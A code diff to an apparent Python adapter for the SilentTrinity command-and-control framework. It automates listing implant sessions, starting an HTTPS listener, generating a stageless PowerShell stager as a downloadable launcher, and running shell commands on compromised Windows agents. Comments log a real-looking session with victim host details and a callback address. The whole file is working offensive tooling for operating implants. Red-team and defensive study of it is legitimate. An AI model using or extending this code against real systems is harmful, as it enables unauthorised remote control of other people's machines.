@@ -134,10 +134,11 @@ class SilentTriC2(C2):
 
         # ---> {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}}
         # <--- {"type": "message", "id": "i8Qz3wVLUt", "ctx": "sessions", "name": "list", "status": "success", "result": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 2.287958860397339}}}
-        set_ctx = {"id": "eqWKq4m74d", "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
+
+        set_ctx = {"id": gen_random_string(), "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
-        cmd_list = {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
+        cmd_list = {"id": gen_random_string(), "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
         await ws.send(json.dumps(cmd_list))
         response = await recv_(ws)
         agents = response['results']
@@ -153,8 +154,8 @@ class SilentTriC2(C2):
             )
             agents.append(_agent)
         dto = ResponseDto(
-            agents=agents,
             successful_transaction=True,
+            agents=agents,
         )
         return dto
 
@@ -190,26 +191,36 @@ class SilentTriHTTPListenerType(ListenerType):
         ws = self._c2.ws
         await recv_(ws)
         await recv_(ws)
-        set_listeners = {"id": "SeI6WD3JP5", "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
+        set_listeners = {"id": gen_random_string(), "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
         await ws.send(json.dumps(set_listeners))
         await recv_(ws)
 
-        set_https = {"id": "uxQO9VK04w", "ctx": "listeners", "cmd": "use", "args": {"name": "https"}, "data": {}}
+        set_https = {"id": gen_random_string(), "ctx": "listeners", "cmd": "use", "args": {"name": "https"}, "data": {}}
         await ws.send(json.dumps(set_https))
         await recv_(ws)
 
-        set_port = {"id": "RX9o7Z6qQN", "ctx": "listeners", "cmd": "set", "args": {"name": "Port", "value": str(_bindPort)}, "data": {}}
+        set_port = {"id": gen_random_string(), "ctx": "listeners", "cmd": "set", "args": {"name": "Port", "value": str(_bindPort)}, "data": {}}
         await ws.send(json.dumps(set_port))
         await recv_(ws)
 
-        set_iface = {"id": "OsxgyZcfSX", "ctx": "listeners", "cmd": "set", "args": {"name": "BindIP", "value": _bindIp}, "data": {}}
+        set_iface = {"id": gen_random_string(), "ctx": "listeners", "cmd": "set", "args": {"name": "BindIP", "value": _bindIp}, "data": {}}
         await ws.send(json.dumps(set_iface))
         await recv_(ws)
 
-        set_start = {"id": "5atzrUrEXj", "ctx": "listeners", "cmd": "start", "args": {}, "data": {}}
+        set_start = {"id": gen_random_string(), "ctx": "listeners", "cmd": "start", "args": {}, "data": {}}
         await ws.send(json.dumps(set_start))
-        await recv_(ws)
-        return ResponseDto(successful_transaction=True)
+        response = await recv_(ws)
+        result = response.get('result')
+
+        launcher = CreateLauncherDto(
+            payload_content=result['output'],
+            payload_name='st_stageless.' + result['extension']
+            )
+        dto = ResponseDto(
+            successful_transaction=True,
+            created_launcher=launcher
+        )
+        return dto
 
     async def delete_listener(
         self,
@@ -254,15 +265,15 @@ class SilentTriPowershellLauncherType(LauncherType):
         # ---> {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
         # <--- {"type": "message", "id": "4hM4EksY4b", "ctx": "stagers", "name": "generate", "status": "success", "result": {"output": "function Invoke-L..... ", "suggestions": "", "extension": "ps1"}}
 
-        set_ctx = {"id": "xOUvWeyOk3", "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
+        set_ctx = {"id": gen_random_string(), "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
 
-        set_powershell_stagless = {"id": "GSdJMyul3K", "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
+        set_powershell_stagless = {"id": gen_random_string(), "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
         await ws.send(json.dumps(set_powershell_stagless))
         await recv_(ws)
 
-        set_generate = {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
+        set_generate = {"id": gen_random_string(), "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
         await ws.send(json.dumps(set_generate))
         response = await recv_(ws)
         result = response.get('result')
@@ -303,15 +314,15 @@ class PowershellAgentType(AgentType):
         # [*] [TS-UM5UF] b0c71f5e-660b-4f93-b722-9df523b4b063 returned job result (id: Aw8lrj6luD)
         # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
         # desktop-2ld29pj\criso
-        set_ctx = {"id": "Qv9BdutEJ0", "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
+        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
 
-        set_ctx = {"id": "kTZN3U1Xtz", "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
+        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
 
-        set_ctx = {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
+        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         response = await recv_(ws)
         result = response['result']
